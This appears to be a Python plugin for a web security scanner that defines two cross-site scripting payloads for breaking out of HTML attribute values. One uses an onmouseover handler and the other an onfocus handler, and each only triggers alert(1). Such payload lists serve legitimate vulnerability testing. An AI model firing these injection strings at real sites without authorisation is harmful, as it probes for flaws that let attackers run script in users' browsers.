from core.payload_plugins.base import PayloadPlugin


class AttributePayloads(PayloadPlugin):
    name = "attribute_payloads"
    context = "attribute"

    def get_payloads(self):
        return [
            "\" onmouseover=alert(1) x=\"",
            "' onfocus=alert(1) x='"
        ]